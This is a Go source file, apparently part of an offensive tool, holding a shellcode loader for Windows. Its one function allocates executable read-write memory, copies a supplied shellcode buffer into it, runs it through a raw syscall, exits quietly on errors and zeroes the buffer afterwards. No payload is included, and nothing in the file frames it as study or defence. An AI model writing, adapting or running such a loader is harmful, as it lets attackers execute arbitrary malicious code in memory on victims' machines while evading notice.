package loader

import (
	"os"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

func StaneAlone(shellcode []byte) {
	mem, err := windows.VirtualAlloc(0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_EXECUTE_READWRITE)
	if err != nil {
		os.Exit(0)
	}
	defer func() {
		err := windows.VirtualFree(mem, 0, windows.MEM_RELEASE)
		if err != nil {
			os.Exit(0)
		}
	}()

	buffer := (*[1_000_000]byte)(unsafe.Pointer(mem))[:len(shellcode):len(shellcode)]
	copy(buffer, shellcode)

	_, _, err = syscall.Syscall(mem, 0, 0, 0, 0)

	for i := range buffer {
		buffer[i] = 0
	}
}
